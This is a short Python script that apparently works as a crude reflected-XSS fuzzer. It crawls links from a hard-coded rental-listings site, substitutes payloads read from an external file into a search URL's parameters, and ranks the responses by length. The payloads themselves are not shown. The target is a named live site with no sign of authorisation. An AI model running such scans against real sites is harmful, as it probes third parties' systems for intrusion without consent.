import urllib

from urllib.parse import urlsplit, parse_qs
import urllib.request

import collections
import lxml.html
import requests
import re

url_param = []
final_dict_result = {k: [] for k in range(2)}


# given a url returns list of all sublinks within the same domain
def getLinks(url):
    urlList = []
    absolute = []
    urlList.append(url)
    sublinks = getSubLinks(url)
    for link in sublinks:
        absolute.append(url + '/' + link)
        # urlList.extend(getLinks(absolute))

    print(absolute)
    # distincList = sameDomain()

    with open('sub_url.txt', 'w') as f:
        for item in absolute:
            sub_url = item
            f.write("%s \n" % sub_url)
    return urlList


# determine whether two links are within the same domain
def sameDomain(url, dom):
    return url.startswith(dom)


# get tree of sublinks in same domain, url is root
def getSubLinks(urls):
    sublinks = []
    connection = urllib.request.urlopen(urls)


    dom = lxml.html.fromstring(connection.read())
    for link in dom.xpath('//a/@href'):
        if not (link.startswith('#') or link.startswith('http') or link.startswith('mailto:')):
            sublinks.append(link)
    return sublinks


def checkXSSandResultAnalysis():
    url = "https://www.rentalhomes.com/refine?date_start=2019-08-24&date_end=2019-09-19&ref=home&search=gg"
    query = urlsplit(url).query
    params = parse_qs(query)

    print(dict(params))
    var = {k: v[0] for k, v in params.items()}

    print(url_param)
    for key in var.keys():
        url_param.append("=" + var[key])

    final_dict_result = {}
    for count in url_param:
        with open('xss_payload.txt') as fp:
            for line in fp:
                base_url = url
                payload = line.strip(' \t\n\r')
                payload = "=" + payload
                replacedURL = base_url.replace(count, payload)
                print("param                             " + count)
                print("payload                           " + payload)
                print("replaced url link                 " + replacedURL)

                req = requests.get(replacedURL)
                print(req.status_code)
                if req.status_code == 200:
                    # total_response = urllib.request.urlopen(hhh).read()
                    # length = len(total_response)

                    lengths = len(req.content)
                    print(lengths)
                    print("\n")
                    final_dict_result.update({replacedURL: lengths})
                    # final_dict_result = {"URL": hhh, "Length": lengths}

    print(final_dict_result)
    assc_dist = sorted(final_dict_result.items(), key=lambda kv: (kv[0], kv[1]))
    a1_sorted_keys = sorted(final_dict_result, key=final_dict_result.get, reverse=True)
    print(a1_sorted_keys)
    with open('XSS_Result.txt', 'w') as f:
        for r in a1_sorted_keys:
            print(r, final_dict_result[r])
            pp = str(r)
            pp1 = str(final_dict_result[r])
            string =pp + pp1
            f.write("%s \n" % string)


getLinks("https://www.rentalhomes.com")
checkXSSandResultAnalysis()

